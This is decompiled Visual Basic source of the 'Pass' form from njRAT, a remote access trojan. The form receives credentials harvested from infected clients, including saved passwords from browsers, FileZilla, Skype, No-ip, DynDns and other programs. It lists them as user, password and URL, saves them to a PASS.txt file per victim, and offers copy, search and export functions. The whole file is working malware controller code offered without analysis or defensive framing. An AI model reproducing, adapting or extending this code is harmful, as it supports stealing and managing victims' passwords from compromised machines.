Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000021 RID: 33
	<DesignerGenerated()>
	Public Partial Class Pass
		Inherits Form

		' Token: 0x06000470 RID: 1136 RVA: 0x0016DBFC File Offset: 0x0016BFFC
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Pass.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = Pass.__ENCList.Count = Pass.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Pass.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Pass.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								Pass.__ENCList(num) = Pass.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Pass.__ENCList.RemoveRange(num, Pass.__ENCList.Count - num)
					Pass.__ENCList.Capacity = Pass.__ENCList.Count
				End If
				Pass.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000196 RID: 406
		' (get) Token: 0x06000473 RID: 1139 RVA: 0x0016E7D4 File Offset: 0x0016CBD4
		' (set) Token: 0x06000474 RID: 1140 RVA: 0x0016E7EC File Offset: 0x0016CBEC
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip1 = value
			End Set
		End Property

		' Token: 0x17000197 RID: 407
		' (get) Token: 0x06000475 RID: 1141 RVA: 0x0016E7F8 File Offset: 0x0016CBF8
		' (set) Token: 0x06000476 RID: 1142 RVA: 0x0016E810 File Offset: 0x0016CC10
		Friend Overridable Property CopyUseToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopyUseToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyUseToolStripMenuItem_Click
				Dim flag As Boolean = Me._CopyUseToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._CopyUseToolStripMenuItem.Click, value2
				End If
				Me._CopyUseToolStripMenuItem = value
				flag = (Me._CopyUseToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._CopyUseToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000198 RID: 408
		' (get) Token: 0x06000477 RID: 1143 RVA: 0x0016E870 File Offset: 0x0016CC70
		' (set) Token: 0x06000478 RID: 1144 RVA: 0x0016E888 File Offset: 0x0016CC88
		Friend Overridable Property CopyPassToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopyPassToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyPassToolStripMenuItem_Click
				Dim flag As Boolean = Me._CopyPassToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._CopyPassToolStripMenuItem.Click, value2
				End If
				Me._CopyPassToolStripMenuItem = value
				flag = (Me._CopyPassToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._CopyPassToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000199 RID: 409
		' (get) Token: 0x06000479 RID: 1145 RVA: 0x0016E8E8 File Offset: 0x0016CCE8
		' (set) Token: 0x0600047A RID: 1146 RVA: 0x0016E900 File Offset: 0x0016CD00
		Friend Overridable Property CopySiteToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopySiteToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopySiteToolStripMenuItem_Click
				Dim flag As Boolean = Me._CopySiteToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._CopySiteToolStripMenuItem.Click, value2
				End If
				Me._CopySiteToolStripMenuItem = value
				flag = (Me._CopySiteToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._CopySiteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700019A RID: 410
		' (get) Token: 0x0600047B RID: 1147 RVA: 0x0016E960 File Offset: 0x0016CD60
		' (set) Token: 0x0600047C RID: 1148 RVA: 0x0016E978 File Offset: 0x0016CD78
		Friend Overridable Property CopyALLToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopyALLToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyALLToolStripMenuItem_Click
				Dim flag As Boolean = Me._CopyALLToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._CopyALLToolStripMenuItem.Click, value2
				End If
				Me._CopyALLToolStripMenuItem = value
				flag = (Me._CopyALLToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._CopyALLToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700019B RID: 411
		' (get) Token: 0x0600047D RID: 1149 RVA: 0x0016E9D8 File Offset: 0x0016CDD8
		' (set) Token: 0x0600047E RID: 1150 RVA: 0x0016E9F0 File Offset: 0x0016CDF0
		Friend Overridable Property SaveAllToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._SaveAllToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Me._SaveAllToolStripMenuItem = value
			End Set
		End Property

		' Token: 0x1700019C RID: 412
		' (get) Token: 0x0600047F RID: 1151 RVA: 0x0016E9FC File Offset: 0x0016CDFC
		' (set) Token: 0x06000480 RID: 1152 RVA: 0x0016EA14 File Offset: 0x0016CE14
		Friend Overridable Property InClipboardToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._InClipboardToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.InClipboardToolStripMenuItem_Click
				Dim flag As Boolean = Me._InClipboardToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._InClipboardToolStripMenuItem.Click, value2
				End If
				Me._InClipboardToolStripMenuItem = value
				flag = (Me._InClipboardToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._InClipboardToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700019D RID: 413
		' (get) Token: 0x06000481 RID: 1153 RVA: 0x0016EA74 File Offset: 0x0016CE74
		' (set) Token: 0x06000482 RID: 1154 RVA: 0x0016EA8C File Offset: 0x0016CE8C
		Friend Overridable Property InDiskToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._InDiskToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.InDiskToolStripMenuItem_Click
				Dim flag As Boolean = Me._InDiskToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._InDiskToolStripMenuItem.Click, value2
				End If
				Me._InDiskToolStripMenuItem = value
				flag = (Me._InDiskToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._InDiskToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700019E RID: 414
		' (get) Token: 0x06000483 RID: 1155 RVA: 0x0016EAEC File Offset: 0x0016CEEC
		' (set) Token: 0x06000484 RID: 1156 RVA: 0x0016EB04 File Offset: 0x0016CF04
		Friend Overridable Property FindToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._FindToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FindToolStripMenuItem_Click
				Dim flag As Boolean = Me._FindToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._FindToolStripMenuItem.Click, value2
				End If
				Me._FindToolStripMenuItem = value
				flag = (Me._FindToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._FindToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700019F RID: 415
		' (get) Token: 0x06000485 RID: 1157 RVA: 0x0016EB64 File Offset: 0x0016CF64
		' (set) Token: 0x06000486 RID: 1158 RVA: 0x0016EB7C File Offset: 0x0016CF7C
		Friend Overridable Property RemoveEmptyPWToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RemoveEmptyPWToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RemoveEmptyPWToolStripMenuItem_Click
				Dim flag As Boolean = Me._RemoveEmptyPWToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._RemoveEmptyPWToolStripMenuItem.Click, value2
				End If
				Me._RemoveEmptyPWToolStripMenuItem = value
				flag = (Me._RemoveEmptyPWToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._RemoveEmptyPWToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001A0 RID: 416
		' (get) Token: 0x06000487 RID: 1159 RVA: 0x0016EBDC File Offset: 0x0016CFDC
		' (set) Token: 0x06000488 RID: 1160 RVA: 0x0016EBF4 File Offset: 0x0016CFF4
		Friend Overridable Property SaveFileDialog1 As SaveFileDialog
			<DebuggerNonUserCode()>
			Get
				Return Me._SaveFileDialog1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As SaveFileDialog)
				Me._SaveFileDialog1 = value
			End Set
		End Property

		' Token: 0x170001A1 RID: 417
		' (get) Token: 0x06000489 RID: 1161 RVA: 0x0016EC00 File Offset: 0x0016D000
		' (set) Token: 0x0600048A RID: 1162 RVA: 0x0016EC18 File Offset: 0x0016D018
		Friend Overridable Property ImageList1 As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._ImageList1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._ImageList1 = value
			End Set
		End Property

		' Token: 0x170001A2 RID: 418
		' (get) Token: 0x0600048B RID: 1163 RVA: 0x0016EC24 File Offset: 0x0016D024
		' (set) Token: 0x0600048C RID: 1164 RVA: 0x0016EC3C File Offset: 0x0016D03C
		Friend Overridable Property MenuStrip1 As MenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._MenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As MenuStrip)
				Me._MenuStrip1 = value
			End Set
		End Property

		' Token: 0x170001A3 RID: 419
		' (get) Token: 0x0600048D RID: 1165 RVA: 0x0016EC48 File Offset: 0x0016D048
		' (set) Token: 0x0600048E RID: 1166 RVA: 0x0016EC60 File Offset: 0x0016D060
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem1_Click
				Dim flag As Boolean = Me._ToolStripMenuItem1 IsNot Nothing
				If flag Then
					RemoveHandler Me._ToolStripMenuItem1.Click, value2
				End If
				Me._ToolStripMenuItem1 = value
				flag = (Me._ToolStripMenuItem1 IsNot Nothing)
				If flag Then
					AddHandler Me._ToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001A4 RID: 420
		' (get) Token: 0x0600048F RID: 1167 RVA: 0x0016ECC0 File Offset: 0x0016D0C0
		' (set) Token: 0x06000490 RID: 1168 RVA: 0x0016ECD8 File Offset: 0x0016D0D8
		Friend Overridable Property L1 As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._L1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Dim value2 As EventHandler = AddressOf Me.L1_DoubleClick
				Dim flag As Boolean = Me._L1 IsNot Nothing
				If flag Then
					RemoveHandler Me._L1.DoubleClick, value2
				End If
				Me._L1 = value
				flag = (Me._L1 IsNot Nothing)
				If flag Then
					AddHandler Me._L1.DoubleClick, value2
				End If
			End Set
		End Property

		' Token: 0x170001A5 RID: 421
		' (get) Token: 0x06000491 RID: 1169 RVA: 0x0016ED38 File Offset: 0x0016D138
		' (set) Token: 0x06000492 RID: 1170 RVA: 0x0016ED50 File Offset: 0x0016D150
		Friend Overridable Property ColumnHeader1 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader1 = value
			End Set
		End Property

		' Token: 0x170001A6 RID: 422
		' (get) Token: 0x06000493 RID: 1171 RVA: 0x0016ED5C File Offset: 0x0016D15C
		' (set) Token: 0x06000494 RID: 1172 RVA: 0x0016ED74 File Offset: 0x0016D174
		Friend Overridable Property ColumnHeader2 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader2 = value
			End Set
		End Property

		' Token: 0x170001A7 RID: 423
		' (get) Token: 0x06000495 RID: 1173 RVA: 0x0016ED80 File Offset: 0x0016D180
		' (set) Token: 0x06000496 RID: 1174 RVA: 0x0016ED98 File Offset: 0x0016D198
		Friend Overridable Property ColumnHeader3 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader3 = value
			End Set
		End Property

		' Token: 0x170001A8 RID: 424
		' (get) Token: 0x06000497 RID: 1175 RVA: 0x0016EDA4 File Offset: 0x0016D1A4
		' (set) Token: 0x06000498 RID: 1176 RVA: 0x0016EDBC File Offset: 0x0016D1BC
		Friend Overridable Property ColumnHeader4 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader4 = value
			End Set
		End Property

		' Token: 0x170001A9 RID: 425
		' (get) Token: 0x06000499 RID: 1177 RVA: 0x0016EDC8 File Offset: 0x0016D1C8
		' (set) Token: 0x0600049A RID: 1178 RVA: 0x0016EDE0 File Offset: 0x0016D1E0
		Friend Overridable Property ColumnHeader5 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader5 = value
			End Set
		End Property

		' Token: 0x0600049B RID: 1179 RVA: 0x0016EDEC File Offset: 0x0016D1EC
		Public Sub New()
			Pass.__ENCAddToList(Me)
			Me.bool_0 = True
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600049C RID: 1180 RVA: 0x0016EE0C File Offset: 0x0016D20C
		Public Sub FxCOLM(L1 As ListView)
			Dim num As Integer = L1.Columns.Count - 1
			For i As Integer = 0 To num
				L1.Columns(i).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
			Next
		End Sub

		' Token: 0x0600049D RID: 1181 RVA: 0x0016EE50 File Offset: 0x0016D250
		Private Sub InClipboardToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim text As String = Me.SV()
				Dim flag As Boolean = text.Length > 0
				If flag Then
					Clipboard.SetText(text)
					Interaction.MsgBox("Saved in Clipboard", MsgBoxStyle.OkOnly, Nothing)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600049E RID: 1182 RVA: 0x0016EEAC File Offset: 0x0016D2AC
		Private Sub InDiskToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.SaveFileDialog1.ShowDialog() = DialogResult.OK
				If flag Then
					File.WriteAllText(Me.SaveFileDialog1.FileName, Me.SV())
					Interaction.MsgBox(Me.SaveFileDialog1.FileName, MsgBoxStyle.OkOnly, Nothing)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600049F RID: 1183 RVA: 0x0016EF1C File Offset: 0x0016D31C
		Private Sub FindToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim text As String = Interaction.InputBox("Search", String.Empty, String.Empty, -1, -1)
				Dim flag As Boolean = Operators.CompareString(text, String.Empty, False) <> 0
				If flag Then
					Dim pass As Pass = New Pass() With { .Name = "e", .Text = "Search For '" + text + "'" }
					pass.Show()
					Try
						For Each obj As Object In Me.L1.Items
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							Dim num As Integer = 0
							Do
								flag = (Strings.InStr(listViewItem.SubItems(num).Text.ToLower(), text.ToLower(), CompareMethod.Binary) > 0)
								If flag Then
									Dim listViewItem2 As ListViewItem = pass.L1.Items.Add(listViewItem.Text, listViewItem.ImageIndex)
									Dim num2 As Integer = listViewItem.SubItems.Count - 1
									For i As Integer = 1 To num2
										listViewItem2.SubItems.Add(listViewItem.SubItems(i).Text)
									Next
								Else
									num += 1
								End If
							Loop While num <= 2
						Next
					Finally
						Dim enumerator As IEnumerator
						flag = (TypeOf enumerator Is IDisposable)
						If flag Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
					pass.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(pass.L1.Items.Count))
					Me.FxCOLM(pass.L1)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060004A0 RID: 1184 RVA: 0x0016F120 File Offset: 0x0016D520
		Private Sub CopyUseToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L1.SelectedItems(0).Text.Length > 0
				If flag Then
					Clipboard.SetText(Me.L1.SelectedItems(0).Text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060004A1 RID: 1185 RVA: 0x0016F194 File Offset: 0x0016D594
		Private Sub CopyPassToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L1.SelectedItems(0).SubItems(1).Text.Length > 0
				If flag Then
					Clipboard.SetText(Me.L1.SelectedItems(0).SubItems(1).Text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060004A2 RID: 1186 RVA: 0x0016F21C File Offset: 0x0016D61C
		Private Sub CopyALLToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim text As String = String.Empty
				Dim flag As Boolean
				Try
					For Each obj As Object In Me.L1.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = String.Concat(New String() { text, "URL: ", listViewItem.SubItems(2).Text, vbCrLf & "USR: ", listViewItem.SubItems(0).Text, vbCrLf & "PWD: ", listViewItem.SubItems(1).Text, vbCrLf & vbCrLf })
					Next
				Finally
					Dim enumerator As IEnumerator
					flag = (TypeOf enumerator Is IDisposable)
					If flag Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				flag = (text.Length > 0)
				If flag Then
					Clipboard.SetText(text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060004A3 RID: 1187 RVA: 0x0016F34C File Offset: 0x0016D74C
		Private Sub RemoveEmptyPWToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.Items
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					Dim flag As Boolean = Operators.CompareString(listViewItem.SubItems(1).Text, String.Empty, False) = 0
					If flag Then
						listViewItem.Remove()
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			Me.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(Me.L1.Items.Count))
		End Sub

		' Token: 0x060004A4 RID: 1188 RVA: 0x0016F410 File Offset: 0x0016D810
		Public Function SV() As String
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.L1.Items
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					text = String.Concat(New String() { text, "URL: ", listViewItem.SubItems(2).Text, vbCrLf & "USR: ", listViewItem.Text, vbCrLf & "PWD: ", listViewItem.SubItems(1).Text, vbCrLf & vbCrLf })
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			Return text
		End Function

		' Token: 0x060004A5 RID: 1189 RVA: 0x0016F504 File Offset: 0x0016D904
		Public Sub XD(ByRef c As Client, ByRef S As String)
			Dim array As String() = Strings.Split(S, " ", -1, CompareMethod.Binary)
			Dim num As Integer = -1
			Dim flag As Boolean = Not Directory.Exists(c.Folder)
			If flag Then
				Directory.CreateDirectory(c.Folder)
			End If
			Dim array2 As String() = New String() { "FileZilla", "No-ip", "DynDns", "Paltalk", "FireFox", "Chrome", "MSN", "Yahoo", "Opera", "Internet Explorer", "ooVoo", "DUC v3", "Skype" }
			Dim text As String = String.Empty
			For Each text2 As String In array
				Try
					flag = (text2.Length > 0)
					If flag Then
						Dim flag2 As Boolean = Operators.CompareString(text2, "*", False) = 0
						If flag2 Then
							num += 1
						Else
							flag2 = Not text2.Contains(":")
							If flag2 Then
								text2 = Class6.smethod_16(text2)
							End If
							Dim array4 As String() = Strings.Split(text2, ":", -1, CompareMethod.Binary)
							flag2 = (array4.Length > 3)
							If flag2 Then
								Dim expression As String = text2
								Dim find As String = array4(0) + ":" + array4(1)
								Dim text3 As String = array4(0) + ":" + array4(1)
								array4 = Strings.Split(Strings.Replace(expression, find, Class6.smethod_14(text3), 1, -1, CompareMethod.Binary), ":", -1, CompareMethod.Binary)
							End If
							Dim listViewItem As ListViewItem = New ListViewItem()
							listViewItem = Me.L1.Items.Add(Class6.smethod_16(array4(1)), num)
							listViewItem.SubItems.Add(Class6.smethod_16(array4(2)))
							listViewItem.SubItems.Add(Class6.smethod_16(array4(0)))
							listViewItem.SubItems.Add(array2(num))
							NewLateBinding.LateCall(listViewItem.SubItems, Nothing, "Add", New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(c.L)))) }, Nothing, Nothing, Nothing, True)
							text = text + "USR: " + listViewItem.Text + vbCrLf
							text = text + "PWD: " + listViewItem.SubItems(1).Text + vbCrLf
							text = text + "URL: " + listViewItem.SubItems(2).Text + vbCrLf & vbCrLf
						End If
					End If
				Catch ex As Exception
				End Try
			Next
			Try
				File.WriteAllText(c.Folder + "PASS.txt", text)
			Catch ex2 As Exception
			End Try
			Me.FxCOLM(Me.L1)
			Me.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(Me.L1.Items.Count))
		End Sub

		' Token: 0x060004A6 RID: 1190 RVA: 0x0016F86C File Offset: 0x0016DC6C
		Private Sub L1_DoubleClick(sender As Object, e As EventArgs)
			Try
				Dim text As String = Me.L1.SelectedItems(0).SubItems(2).Text
				Dim flag As Boolean = Not text.Contains("://")
				If flag Then
					text = "http://" + text
				End If
				Process.Start(text)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060004A7 RID: 1191 RVA: 0x0016F8E8 File Offset: 0x0016DCE8
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Me.bool_0 = True
			Me.L1.BringToFront()
		End Sub

		' Token: 0x060004A8 RID: 1192 RVA: 0x0016F900 File Offset: 0x0016DD00
		Private Sub CopySiteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L1.SelectedItems(0).SubItems(2).Text.Length > 0
				If flag Then
					Clipboard.SetText(Me.L1.SelectedItems(0).SubItems(2).Text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x04000210 RID: 528
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000212 RID: 530
		<AccessedThroughProperty("ContextMenuStrip1")>
		Private _ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x04000213 RID: 531
		<AccessedThroughProperty("CopyUseToolStripMenuItem")>
		Private _CopyUseToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000214 RID: 532
		<AccessedThroughProperty("CopyPassToolStripMenuItem")>
		Private _CopyPassToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000215 RID: 533
		<AccessedThroughProperty("CopySiteToolStripMenuItem")>
		Private _CopySiteToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000216 RID: 534
		<AccessedThroughProperty("CopyALLToolStripMenuItem")>
		Private _CopyALLToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000217 RID: 535
		<AccessedThroughProperty("SaveAllToolStripMenuItem")>
		Private _SaveAllToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000218 RID: 536
		<AccessedThroughProperty("InClipboardToolStripMenuItem")>
		Private _InClipboardToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000219 RID: 537
		<AccessedThroughProperty("InDiskToolStripMenuItem")>
		Private _InDiskToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400021A RID: 538
		<AccessedThroughProperty("FindToolStripMenuItem")>
		Private _FindToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400021B RID: 539
		<AccessedThroughProperty("RemoveEmptyPWToolStripMenuItem")>
		Private _RemoveEmptyPWToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400021C RID: 540
		<AccessedThroughProperty("SaveFileDialog1")>
		Private _SaveFileDialog1 As SaveFileDialog

		' Token: 0x0400021D RID: 541
		<AccessedThroughProperty("ImageList1")>
		Private _ImageList1 As ImageList

		' Token: 0x0400021E RID: 542
		<AccessedThroughProperty("MenuStrip1")>
		Private _MenuStrip1 As MenuStrip

		' Token: 0x0400021F RID: 543
		<AccessedThroughProperty("ToolStripMenuItem1")>
		Private _ToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x04000220 RID: 544
		<AccessedThroughProperty("L1")>
		Private _L1 As GClass9

		' Token: 0x04000221 RID: 545
		<AccessedThroughProperty("ColumnHeader1")>
		Private _ColumnHeader1 As ColumnHeader

		' Token: 0x04000222 RID: 546
		<AccessedThroughProperty("ColumnHeader2")>
		Private _ColumnHeader2 As ColumnHeader

		' Token: 0x04000223 RID: 547
		<AccessedThroughProperty("ColumnHeader3")>
		Private _ColumnHeader3 As ColumnHeader

		' Token: 0x04000224 RID: 548
		<AccessedThroughProperty("ColumnHeader4")>
		Private _ColumnHeader4 As ColumnHeader

		' Token: 0x04000225 RID: 549
		<AccessedThroughProperty("ColumnHeader5")>
		Private _ColumnHeader5 As ColumnHeader

		' Token: 0x04000226 RID: 550
		Private bool_0 As Boolean
	End Class
End Namespace
